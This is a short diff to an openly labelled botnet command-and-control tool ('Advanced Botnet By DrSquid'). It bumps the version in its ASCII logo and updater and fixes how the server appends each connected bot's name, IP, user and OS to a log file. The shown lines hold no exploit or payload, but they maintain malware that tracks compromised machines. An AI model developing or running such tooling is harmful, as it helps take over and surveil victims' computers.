@@ -34,12 +34,12 @@ class BotNet:
                                || || ||
                                || || ||
                                || || ||
-  _________            .__    .||_||_||__          __  ________         ________       .________
- /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  _\_____  \      |   ____/
- \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ / _(__  <      |____  \ 
- /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   / /       \     /       \\
-/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_/ /______  / /\ /______  /
-        \/    |__|             \/ || ||  \/     \/             \/              \/  \/        \/ 
+  _________            .__    .||_||_||__          __  ________         ________       ________
+ /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  _\_____  \     /  _____/
+ \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ / _(__  <    /   __  \ 
+ /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   / /       \   \  |__\  \\
+/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_/ /______  / /\ \_____  /
+        \/    |__|             \/ || ||  \/     \/             \/              \/  \/       \/ 
                                || || ||
                                || || ||
                                || || ||
@@ -329,8 +329,10 @@ Advanced Botnet By DrSquid
         except:
             os = "Unknown"
         self.botnum += 1
+        ogcontent = open(self.botinfofile,"r")
+        content = ogcontent.read()
         file = open(self.botinfofile,"w")
-        file.write(open(self.botinfofile,"r").read())
+        file.write(content)
         file.write(f"\n[+] Botname: {name}\n[+] IP: {ip}\n[+] Src Port: {srcport}\n[+] User: {osuser}\n[+] OS: {os}\n[+] Conn: {conn}\n")
         file.close()
         return [name, ip, srcport, osuser, os, conn]
@@ -4516,7 +4518,7 @@ bot.initiate_connection()
         return payload
 class AutoUpdate:
     def __init__(self):
-        self.version = 3.5
+        self.version = 3.6
     def check_update(self):
         print(BotNet.logo(None))
         print("[+] Checking for updates.....")
